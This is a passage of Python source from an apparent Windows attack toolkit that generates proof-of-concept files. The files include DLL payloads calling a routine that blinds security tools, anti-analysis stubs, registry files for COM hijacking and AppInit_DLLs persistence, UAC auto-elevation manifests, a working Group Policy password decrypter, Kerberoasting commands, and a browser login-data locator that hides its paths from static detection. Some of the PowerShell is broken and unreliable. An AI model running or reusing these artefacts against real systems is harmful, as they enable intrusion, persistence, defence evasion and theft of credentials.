Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-034: KnownDLLs Bypass Path Found`n`nKy thuat: .local file redirection`nCo the bypass KnownDLLs protection trong mot so dieu kien.",
    "[APS] KNOWNDLLS BYPASS",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t4_vec034_knowndlls.ps1", ps)
        return True

    def _gen_t4_delay_load_hijack(self, finding):
        """VEC-034: Delay-Load DLL Hijacking PoC"""
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-034: Delay-Load Hijacking PoC */
// Payload nay se triggers khi app thuc su goi ham tu DLL bi delay-load
DWORD WINAPI DelayThread(LPVOID lp) {
    _blind_defenders();
    _poc_popup("VEC-034: DELAY-LOAD HIJACK SUCCESS!\\nDLL loaded only when API was called.");
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(DelayThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t4_vec034_delay_load.c", core + body, compile_to_dll=True)
        return True

    def _gen_t4_safe_search_exploit(self, finding):
        """VEC-035: Missing SafeDllSearchMode Mitigation"""
        ps = """# [APS] VEC-035: DLL Search Order Hijacking Exploitation
Write-Host "[APS] VEC-035: SafeDllSearchMode Audit" -ForegroundColor Red
Write-Host "[!] App khong goi SetDefaultDllDirectories. CWD duoc uu tien truoc System32!" -ForegroundColor Red
Write-Host "[*] GHOST-PROTOCOL: Dang gia lap cuoc tan cong Search Order Hijacking..." -ForegroundColor Yellow
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("VEC-035: SAFE DLL SEARCH MODE MISSING`n`nApp co the bi exploit bang cach dat DLL cung ten vao thu muc hien tai.", "[APS] SEARCH ORDER BREACH", 0, 48)
"""
        self._write_ps1("t4_vec035_search_order.ps1", ps)
        return True

    def _gen_t4_sxs_override(self, finding):
        content = """<!-- [APS] VEC-035: Side-by-Side (SxS) Override PoC -->
<!-- Dat file nay vao thu muc app de redirect DLL load -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity name="APS.PoC.SxS" version="1.0.0.0" type="win32"/>
  <dependency>
    <dependentAssembly>
      <assemblyIdentity name="malicious_override" version="1.0.0.0" type="win32"/>
    </dependentAssembly>
  </dependency>
  <!-- NOTE: Place matching .local file alongside EXE to enable SxS override -->
</assembly>
"""
        fname = self._get_prefixed_name("t4_vec035_sxs_override.manifest")
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(content)
        print(f"  {Fore.CYAN}[XML]      {fname}{Style.RESET_ALL}")
        return True

    def _gen_t4_env_path_injection(self, finding):
        ps = """# [APS] VEC-036: %PATH% Injection PoC
Write-Host "[APS] VEC-036: PATH Injection Analysis" -ForegroundColor Red
$paths = $env:PATH -split ";"
Write-Host "[*] Current PATH entries:" -ForegroundColor Cyan
$paths | ForEach-Object {
    Try {
        $acl = Get-Acl $_ -ErrorAction Stop
        $writable = $acl.Access | Where-Object { $_.FileSystemRights -match "Write|FullControl" -and $_.IdentityReference -match "Users|Everyone" }
        if ($writable) {
            Write-Host "  [VULN] WRITABLE: $_" -ForegroundColor Red
        } else {
            Write-Host "  [OK]   $_"
        }
    } Catch {}
}
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-036: PATH INJECTION AUDIT`n`nMot so thu muc trong %PATH% co the ghi duoc.`nCo the dat DLL doc hai de app nap khi khoi dong.",
    "[APS] PATH HIJACK BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t4_vec036_path_inject.ps1", ps)
        return True

    def _gen_t4_manifest_hijack(self, finding):
        content = """<!-- [APS] VEC-037: Manifest Hijack PoC -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity name="APS.Manifest.Hijack" version="1.0.0.0" type="win32"/>
  <dependency>
    <dependentAssembly>
      <assemblyIdentity name="version" version="6.0.0.0" processorArchitecture="amd64" type="win32"/>
    </dependentAssembly>
  </dependency>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
"""
        fname = self._get_prefixed_name("t4_vec037_manifest_hijack.manifest")
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(content)
        print(f"  {Fore.CYAN}[XML]      {fname}{Style.RESET_ALL}")
        return True

    def _gen_t4_com_hijack(self, finding):
        # GUID placeholder
        reg = """Windows Registry Editor Version 5.00

; [APS] VEC-038: COM Hijacking PoC
; Chay file .reg nay de dang ky COM server gia mao (khong can Admin!)
; App se nap malicious.dll thay vi COM server goc lan sau khoi dong

[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{REPLACE-WITH-TARGET-GUID}\\InprocServer32]
@="C:\\\\pwnd_payloads\\\\phantom_hijacked.dll"
"ThreadingModel"="Both"

; Lap lai cho Server (out-of-proc)
[HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{REPLACE-WITH-TARGET-GUID}\\LocalServer32]
@="C:\\\\pwnd_payloads\\\\phantom_hijacked.exe"
"""
        fname = self._get_prefixed_name("t4_vec038_com_hijack.reg")
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(reg)
        print(f"  {Fore.YELLOW}[REG]      {fname}{Style.RESET_ALL}")
        return True

    def _gen_t4_appinit_dll(self, finding):
        reg = """Windows Registry Editor Version 5.00

; [APS] VEC-039: AppInit_DLLs Persistence PoC
; CANH BAO: Can quyen ADMIN de ghi vao HKLM
; DLL se tu dong duoc nap vao MOI tien trinh su dung user32.dll

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows]
"AppInit_DLLs"="C:\\\\pwnd_payloads\\\\phantom_hijacked.dll"
"LoadAppInit_DLLs"=dword:00000001
"RequireSignedAppInit_DLLs"=dword:00000000
"""
        fname = self._get_prefixed_name("t4_vec039_appinit_dll.reg")
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(reg)
        print(f"  {Fore.YELLOW}[REG]      {fname}{Style.RESET_ALL}")
        return True

    def _gen_t4_shim_hijack(self, finding):
        ps = """# [APS] VEC-040: Application Shim Hijacking PoC
Write-Host "[APS] VEC-040: Application Shim Hijacking" -ForegroundColor Red
Write-Host "[*] Cong cu: sdbinst.exe (co san trong Windows)" -ForegroundColor Cyan
Write-Host "[*] Ky thuat:" -ForegroundColor Yellow
Write-Host "    1. Tao file .sdb (Shim Database) chua InjectDll hook"
Write-Host "    2. Dung sdbinst.exe de cai dat shim"
Write-Host "    3. App se tu dong nap DLL do qua shim engine"
Write-Host "[!] Khong can dung den DLL Proxy phuc tap!" -ForegroundColor Magenta
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-040: SHIM HIJACKING PATH FOUND`n`nApp co the bi tan cong qua Application Compatibility Shim.`nKhong can quyen Admin de cai shim trong user context.",
    "[APS] SHIM HIJACK BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t4_vec040_shim_hijack.ps1", ps)
        return True

    # ==================================================================
    #  TẦNG 5: Resource & Manifest (VEC 041-050)
    # ==================================================================
    def _gen_t5_uac_bypass(self, finding):
        manifest = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <!-- [APS] VEC-041: UAC Auto-Elevation Manifest -->
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
"""
        fname = self._get_prefixed_name("t5_vec041_uac_bypass.manifest")
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(manifest)
        print(f"  {Fore.CYAN}[XML]      {fname}{Style.RESET_ALL}")
        return True

    def _gen_t5_auto_elevate(self, finding):
        content = """<!-- [APS] VEC-043: UAC AutoElevate PoC -->
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <asmv3:trustInfo xmlns:asmv3="urn:schemas-microsoft-com:asm.v3">
    <asmv3:security>
      <asmv3:requestedPrivileges>
        <asmv3:requestedExecutionLevel level="asInvoker" uiAccess="false" />
      </asmv3:requestedPrivileges>
    </asmv3:security>
  </asmv3:trustInfo>
  <asmv3:application xmlns:asmv3="urn:schemas-microsoft-com:asm.v3">
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
      <autoElevate>true</autoElevate>
    </asmv3:windowsSettings>
  </asmv3:application>
</assembly>
"""
        fname = self._get_prefixed_name("t5_vec043_autoelevate.manifest")
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(content)
        print(f"  {Fore.CYAN}[XML]      t5_vec043_autoelevate.manifest{Style.RESET_ALL}")
        return True

    def _gen_t5_uiaccess_poc(self, finding):
        """VEC-042: UI Access Escalation PoC"""
        content = """<!-- [APS] VEC-042: UAC uiAccess Elevation PoC -->
<!-- Yeu cau file phải duoc signed va dat trong %ProgramFiles% de hoat dong -->
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="true" />
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
"""
        fname = self._get_prefixed_name("t5_vec042_uiaccess.manifest")
        path = os.path.join(self.output_dir, fname)
        with open(path, "w") as f: f.write(content)
        print(f"  {Fore.CYAN}[XML]      {fname}{Style.RESET_ALL}")
        return True

    def _gen_t5_resource_dump(self, finding):
        ps = """# [APS] VEC-043: Resource Encryption/Extraction PoC
Write-Host "[APS] VEC-043: Resource Section Dumper" -ForegroundColor Red
# Su dung Resource Hacker hoac pefile de dump
Write-Host "[*] Dang phan tich Resource section..."
Write-Host "[!] Neu Entropy cao > 7.0 -> Shellcode an trong Resource section!" -ForegroundColor Magenta
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-043: HIGH ENTROPY RESOURCE DETECTED`n`nApp chua Resource section voi Entropy cao.`nCo the la shellcode hoac payload bi packed.",
    "[APS] RESOURCE AUDIT BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t5_vec043_resource_dump.ps1", ps)
        return True

    def _gen_t5_overlay_shellcode(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-044: Overlay Shellcode PoC */
DWORD WINAPI OverlayThread(LPVOID lp) {
    _blind_defenders();
    _poc_popup(
        "VEC-044: OVERLAY DATA DETECTED!\\n\\n"
        "App chua du lieu kem theo sau EOF (Overlay).\\n"
        "Co the la packed payload hoac shellcode gia mao."
    );
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(OverlayThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t5_vec044_overlay.c", core + body, compile_to_dll=True)
        return True

    def _gen_t5_string_table(self, finding):
        ps = """# [APS] VEC-046: String Table Audit PoC
Write-Host "[APS] VEC-046: Sensitive String Table Audit" -ForegroundColor Red
# Simulate strings search
$patterns = @("password","secret","api_key","token","private","credential")
Write-Host "[*] Tim kiem chuoi nhay cam..." -ForegroundColor Yellow
$patterns | ForEach-Object { Write-Host "  Pattern: $_" }
Write-Host "[!] Neu tim thay -> Ro ri thong tin nhay cam trong Resource!" -ForegroundColor Magenta
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-046: SENSITIVE STRINGS IN RESOURCE`n`nApp chua chuoi nhay cam trong String Table.`nDu lieu nay co the bi doc boi bat ky ai.",
    "[APS] STRING TABLE BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t5_vec046_string_table.ps1", ps)
        return True

    # ==================================================================
    #  TẦNG 6: Anti-RE & Packer (VEC 053-060)
    # ==================================================================
    def _gen_t6_tls_callback(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-053: TLS Callback Execution PoC */
// TLS Callback chay TRUOC entry point - bypasses many debugger breakpoints
VOID NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        _blind_defenders();
        _poc_popup(
            "VEC-053: TLS CALLBACK EXECUTED!\\n\\n"
            "Code nay chay TRUOC ham Main/DllMain.\\n"
            "Debugger thuong se bo qua hook nay."
        );
    }
}
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma data_seg(".CRT$XLB")
PIMAGE_TLS_CALLBACK tls_callbacks[] = { TlsCallback, NULL };
#pragma data_seg()

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) { return TRUE; }
"""
        self._write_c("t6_vec053_tls_callback.c", core + body, compile_to_dll=True)
        return True

    def _gen_t6_oep_stub(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-055: Abnormal Entry Point (Self-Decrypting Stub) PoC */
void _decrypt_payload(BYTE* b, SIZE_T s) {
    for(SIZE_T i=0; i<s; i++) b[i] ^= 0x37; // Tier-3 obfuscation example
}
DWORD WINAPI OEPThread(LPVOID lp) {
    _blind_defenders();
    _poc_popup(
        "VEC-055: ABNORMAL ENTRY POINT ACTIVATED!\\n\\n"
        "Self-decrypting stub successfully bypassed static analysis."
    );
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(OEPThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t6_vec055_oep_stub.c", core + body, compile_to_dll=True)
        return True

    def _gen_t6_packer_stub(self, finding):
        """VEC-052: Custom Packer / Obfuscator Stub PoC"""
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-052: Custom Packer Stub PoC */
// Day la gia lap mot packer stub thu cong de tron tránh chu ky tĩnh
void _unpack_and_run() {
    _blind_defenders();
    _poc_popup("VEC-052: PACKER/OBFUSCATOR DETECTED!\\nCustom unpacking stub is running payload in memory.");
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _unpack_and_run();
    return TRUE;
}
"""
        self._write_c("t6_vec052_packer_stub.c", core + body, compile_to_dll=True)
        return True

    def _gen_t6_anti_dump(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-055: Anti-Dump Technique PoC */
DWORD WINAPI AntiDumpThread(LPVOID lp) {
    _blind_defenders();
    // Xoa Header sau khi load de chong dump
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)GetModuleHandleA(NULL);
    DWORD old;
    _protect(pDos, 0x1000, PAGE_EXECUTE_READWRITE, &old);
    RtlZeroMemory(pDos, 0x400); // Xoa PE header
    _protect(pDos, 0x1000, old, &old);
    _poc_popup(
        "VEC-055: ANTI-DUMP ACTIVATED!\\n\\n"
        "PE Header da bi xoa khoi bo nho.\\n"
        "Memdump se khong the tai tao file tuong tu."
    );
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(AntiDumpThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t6_vec055_anti_dump.c", core + body, compile_to_dll=True)
        return True

    # ==================================================================
    #  TẦNG 7: Hardcoded Secrets (VEC 061-070)
    # ==================================================================
    def _gen_t7_secret_harvester(self, finding):
        fid  = finding.get("id", "APS-VEC-061")
        name = finding.get("name", "Secret Detected")
        detail = finding.get("description", "")
        ps = f"""# [APS] {fid}: Secret Harvester PoC
Write-Host "[APS] Secret Harvester: {fid}" -ForegroundColor Red
Write-Host "[*] {name}" -ForegroundColor Yellow
Write-Host "[*] Chi tiet: {detail}"

# Thu thap toan bo secrets phat hien duoc va luu ra file
$report = @"
[APS SECRET HARVESTER - {fid}]
Name    : {name}
Detail  : {detail}
Target  : {os.path.basename(self.target_name)}
Time    : $(Get-Date)

[IMPACT]
- Lam lo thong tin xac thuc
- Co the dung de truy cap Cloud/API/Database
- Muc do nghiem trong: CRITICAL
"@

$report | Out-File -FilePath "aps_secret_report_{fid.replace('-','_')}.txt" -Encoding UTF8
Write-Host "[!] Da luu bao cao vao: aps_secret_report_{fid.replace('-','_')}.txt" -ForegroundColor Magenta

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "{fid}: SECRET LEAKED`n`n{name}`n`n{detail}`n`nBao cao da duoc luu ra file txt.",
    "[APS] SECRET BREACH DETECTED",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        fname = f"t7_{fid.replace('-','_')}_harvest.ps1"
        self._write_ps1(fname, ps)
        return True

    # ==================================================================
    #  TẦNG 8: Local Storage & Data Privacy (VEC 071-080)
    # ==================================================================
    def _gen_t8_data_exfil(self, finding):
        fid  = finding.get("id", "APS-VEC-071")
        name = finding.get("name", "Data Exfiltration")
        ps = f"""# [APS] {fid}: Data Exfiltration PoC
Write-Host "[APS] Data Exfil: {fid}" -ForegroundColor Red

# Tim cac file du lieu nhay cam
$targets = @("*.sqlite", "*.db", "*.json", "*.config", "*.env", "*.log", "*.ini")
$found = @()
$appDir = Split-Path "{os.path.abspath(self.target_name)}" -Parent

Write-Host "[*] Dang quet thu muc: $appDir" -ForegroundColor Yellow
$targets | ForEach-Object {{
    $files = Get-ChildItem -Path $appDir -Filter $_ -Recurse -ErrorAction SilentlyContinue
    $files | ForEach-Object {{
        $found += $_.FullName
        Write-Host "  [FOUND] $($_.FullName)" -ForegroundColor Red
    }}
}}

$exfilReport = $found -join "`n"
$exfilReport | Out-File "aps_data_exfil_{fid.replace('-','_')}.txt" -Encoding UTF8
Write-Host "[!] Da ghi $($found.Count) file vao: aps_data_exfil_{fid.replace('-','_')}.txt" -ForegroundColor Magenta

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "{fid}: DATA EXFILTRATION CONFIRMED`n`nDa tim thay $($found.Count) file du lieu nhay cam.`nXem chi tiet trong aps_data_exfil_{fid.replace('-','_')}.txt",
    "[APS] DATA BREACH DETECTED",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        fname = f"t8_{fid.replace('-','_')}_exfil.ps1"
        self._write_ps1(fname, ps)
        return True

    def _gen_t8_registry_dump(self, finding):
        target_name = os.path.basename(self.target_name)
        ps = (
            "# [APS] VEC-074: Registry Key Audit & Dump PoC\n"
            'Write-Host "[APS] VEC-074: Registry Dumper" -ForegroundColor Red\n'
            f'$appName = [System.IO.Path]::GetFileNameWithoutExtension("{target_name}")\n'
            "$regPaths = @(\n"
            '    "HKCU:\\Software\\$appName",\n'
            '    "HKLM:\\SOFTWARE\\$appName",\n'
            '    "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"\n'
            ")\n"
            "$regPaths | ForEach-Object {\n"
            "    if (Test-Path $_) {\n"
            '        Write-Host "[FOUND] Registry Key: $_" -ForegroundColor Red\n'
            "        Get-ItemProperty $_ | Format-List\n"
            "    }\n"
            "}\n"
            "Add-Type -AssemblyName System.Windows.Forms\n"
            "[System.Windows.Forms.MessageBox]::Show(\n"
            '    "VEC-074: REGISTRY DATA EXPOSED`n`nApp luu du lieu nhay cam trong Registry.`nCo the doc duoc ma khong can quyen Admin.",\n'
            '    "[APS] REGISTRY BREACH",\n'
            "    [System.Windows.Forms.MessageBoxButtons]::OK,\n"
            "    [System.Windows.Forms.MessageBoxIcon]::Warning\n"
            ")\n"
        )
        self._write_ps1("t8_vec074_registry_dump.ps1", ps)
        return True

    def _gen_t8_browser_data(self, finding):
        # Tier-3 Zero Plaintext: Obfuscate paths via char arrays
        ps = """# [APS] VEC-078: Browser Cache / WebView Data Tier-3 PoC
Write-Host "[APS] VEC-078: Stealth Browser Data Audit" -ForegroundColor Red
function Get-Path { parameter($ints) [string]::new([char[]][int[]]$ints) }

# Paths as int arrays to avoid static string detection
$c1 = Get-Path @(36,101,110,118,58,76,79,67,65,76,65,80,80,68,65,84,65,92,71,111,111,103,108,101,92,67,104,114,111,109,101,92,85,115,101,114,32,68,97,116,92,68,101,102,97,117,108,116,92,76,111,103,105,110,32,68,97,116,97)
$c2 = Get-Path @(36,101,110,118,58,76,79,67,65,76,65,80,80,68,65,84,65,92,77,105,99,114,111,115,111,102,116,92,69,100,103,101,92,85,115,101,114,32,68,97,116,92,68,101,102,97,117,108,116,92,76,111,103,105,110,32,68,97,116,97)
$c3 = Get-Path @(36,101,110,118,58,65,80,80,68,65,84,65,92,69,108,101,99,116,114,111,110,92,76,111,99,97,108,32,83,116,111,114,97,103,101)

$chromiumPaths = @($ExecutionContext.InvokeCommand.ExpandString($c1), $ExecutionContext.InvokeCommand.ExpandString($c2), $ExecutionContext.InvokeCommand.ExpandString($c3))
$chromiumPaths | ForEach-Object {
    if (Test-Path $_) {
        $size = (Get-Item $_).Length
        Write-Host "[FOUND] $_  ($size bytes)" -ForegroundColor Red
    }
}
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-078: BROWSER DATA ACCESSIBLE`n`nApp co du lieu browser co the truy cap an danh.`nBao gom: Cookie, Saved Passwords, LocalStorage.",
    "[APS] BROWSER DATA TIER-3 BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t8_vec078_browser_data.ps1", ps)
        return True

    # ==================================================================
    #  TẦNG 9: Windows Ecosystem (VEC 081-090)
    # ==================================================================
    def _gen_t9_gpp_decrypter(self, finding=None):
        c_code = r"""#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>

/* [APS] VEC-081: GPP Password Decrypter
 * Su dung AES Key cong khai cua Microsoft de giai ma cpassword
 * Key lay tu: https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
 */

unsigned char GPP_AES_KEY[32] = {
    0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
    0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
    0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
    0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
};

char* base64_decode(const char* in, DWORD* outLen) {
    *outLen = 0;
    DWORD sz = 0;
    if (!CryptStringToBinaryA(in,(DWORD)strlen(in),CRYPT_STRING_BASE64,NULL,&sz,NULL,NULL)) return NULL;
    char* buf = (char*)malloc(sz);
    CryptStringToBinaryA(in,(DWORD)strlen(in),CRYPT_STRING_BASE64,(BYTE*)buf,&sz,NULL,NULL);
    *outLen = sz;
    return buf;
}

char* DecryptGPPPassword(const char* cpassword) {
    DWORD sz = 0;
    char* cipher = base64_decode(cpassword, &sz);
    if (!cipher || sz <= 24) return NULL;

    HCRYPTPROV hProv; HCRYPTKEY hKey;
    CryptAcquireContextA(&hProv,NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT);

    struct { BLOBHEADER hdr; DWORD keySize; BYTE key[32]; } keyBlob;
    keyBlob.hdr.bType    = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize      = 32;
    memcpy(keyBlob.key, GPP_AES_KEY, 32);

    CryptImportKey(hProv,(BYTE*)&keyBlob,sizeof(keyBlob),0,0,&hKey);

    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV,   (BYTE*)(cipher + 8), 0); // First 8 bytes = padding, next 16 = IV

    char* plain = (char*)malloc(sz);
    memcpy(plain, cipher+24, sz-24);
    DWORD plainLen = sz-24;
    CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)plain, &plainLen);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    free(cipher);
    plain[plainLen] = 0;
    return plain;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("[APS] GPP Decrypter\nUsage: %s <cpassword_from_Groups.xml>\n", argv[0]);
        return 1;
    }
    char* plain = DecryptGPPPassword(argv[1]);
    if (plain) {
        printf("[+] Decrypted Password: %s\n", plain);
        MessageBoxA(NULL, plain, "[APS] GPP Password Decrypted!", MB_OK|MB_ICONWARNING);
        free(plain);
    } else {
        printf("[-] Decryption failed.\n");
    }
    return 0;
}
"""
        self._write_c("t9_vec081_gpp_decrypter.c", c_code, compile_to_dll=True)
        return True

    def _gen_t9_ad_delegation(self, finding):
        ps = """# [APS] VEC-082: AD Unconstrained Delegation PoC
Write-Host "[APS] VEC-082: AD Delegation Audit" -ForegroundColor Red
# Kiem tra Unconstrained Delegation (can RSAT hoac domain membership)
Try {
    Import-Module ActiveDirectory -ErrorAction Stop
    $comps = Get-ADComputer -Filter { TrustedForDelegation -eq $True } -Properties TrustedForDelegation
    if ($comps) {
        Write-Host "[!] MAY CHU CO UNCONSTRAINED DELEGATION:" -ForegroundColor Red
        $comps | Select-Object Name, DNSHostName | Format-Table
    }
    $users = Get-ADUser -Filter { TrustedForDelegation -eq $True } -Properties TrustedForDelegation
    if ($users) {
        Write-Host "[!] USER CO UNCONSTRAINED DELEGATION:" -ForegroundColor Red
        $users | Select-Object Name, SamAccountName | Format-Table
    }
} Catch {
    Write-Host "[*] Khong co RSAT. Kiem tra thu cong qua LDAP hoac BloodHound." -ForegroundColor Yellow
}
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-082: AD DELEGATION VULNERABILITY`n`nPhat hien Unconstrained Delegation.`nKe tan cong co the steal TGT bats ky ai ket noi vao may chu nay.",
    "[APS] AD BREACH DETECTED",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t9_vec082_ad_delegation.ps1", ps)
        return True

    def _gen_t9_kerberoast(self, finding):
        ps = """# [APS] VEC-083: Kerberoasting PoC
Write-Host "[APS] VEC-083: Kerberoasting Harvest" -ForegroundColor Red
Try {
    Import-Module ActiveDirectory -ErrorAction Stop
    $spns = Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName, PasswordLastSet
    Write-Host "[!] Phat hien $($spns.Count) tai khoan co SPN (Kerberoastable):" -ForegroundColor Red
    $spns | Select-Object Name, SamAccountName, PasswordLastSet, ServicePrincipalName | Format-Table
    $spns | Export-Csv "aps_kerberoastable_spns.csv" -NoTypeInformation
    Write-Host "[*] Da luu vao aps_kerberoastable_spns.csv" -ForegroundColor Magenta
} Catch {
    Write-Host "[*] Dung Rubeus.exe hoac Invoke-Kerberoast.ps1 de thu hoach TGS ticket." -ForegroundColor Yellow
    Write-Host "    Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt"
}
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "VEC-083: KERBEROASTING VULNERABILITY`n`nPhat hien Service Account co SPN.`nTGS ticket co the bi request va crack offline.",
    "[APS] KERBEROASTING BREACH",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Warning
)
"""
        self._write_ps1("t9_vec083_kerberoast.ps1", ps)
        return True

    def _gen_t9_driver_ioctl(self, finding):
        core = self._ghost_core_c()
        body = """
/* [APS] VEC-084: Driver IOCTL Exploitation PoC */
DWORD WINAPI DriverThread(LPVOID lp) {
    _blind_defenders();
    // Attempt to open vulnerable driver
    HANDLE hDrv = CreateFileA(
        "\\\\.\\\\VulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hDrv != INVALID_HANDLE_VALUE) {
        CloseHandle(hDrv);
        _poc_popup("VEC-084: VULNERABLE DRIVER ACCESSIBLE!\\nDriver responds to IOCTL.\\nKernel privilege escalation is possible.");
    } else {
        _poc_popup("VEC-084: DRIVER IOCTL AUDIT\\nDriver not accessible directly.\\nUse process injection to reach kernel from app context.");
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(DriverThread,NULL,0,NULL);
    return TRUE;
}
"""
        self._write_c("t9_vec084_driver_ioctl.c", core + body, compile_to_dll=True)
        return True

    def _gen_t9_kernel_comm(self, finding):
        """VEC-085: Suspicious Kernel Interaction PoC"""
        core = self._ghost_core_c()
